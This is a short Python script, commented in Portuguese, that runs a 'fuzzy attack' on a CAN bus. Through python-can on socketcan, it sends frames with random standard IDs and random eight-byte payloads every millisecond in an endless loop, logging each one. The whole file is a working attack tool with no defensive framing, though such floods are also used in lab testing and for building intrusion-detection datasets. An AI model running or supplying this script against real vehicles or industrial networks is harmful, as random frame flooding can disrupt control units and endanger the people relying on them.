import can
import random
import time
import logging

CAN_CHANNEL = 'can0'
CAN_BUSTYPE = 'socketcan'

# ConfiguraÃ§Ã£o do log
logging.basicConfig(
    filename="fuzzy_attack.log",
    level=logging.INFO,
    format="%(asctime)s ID=%(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

def fuzzy_attack():
    bus = can.interface.Bus(channel=CAN_CHANNEL, bustype=CAN_BUSTYPE)
    print("[ATAQUE] Iniciando Fuzzy Attack... (CTRL+C para parar)")
    try:
        while True:
            rand_id = random.randint(0x000, 0x7FF)
            rand_data = [random.randint(0x00, 0xFF) for _ in range(8)]
            msg = can.Message(arbitration_id=rand_id, data=rand_data, is_extended_id=False)
            bus.send(msg)
            logging.info(f"{hex(msg.arbitration_id)} DATA={' '.join(f'{b:02X}' for b in msg.data)}")
            time.sleep(0.001)
    except KeyboardInterrupt:
        print("\n[INFO] Fuzzy Attack interrompido.")
    finally:
        bus.shutdown()

if __name__ == "__main__":
    fuzzy_attack()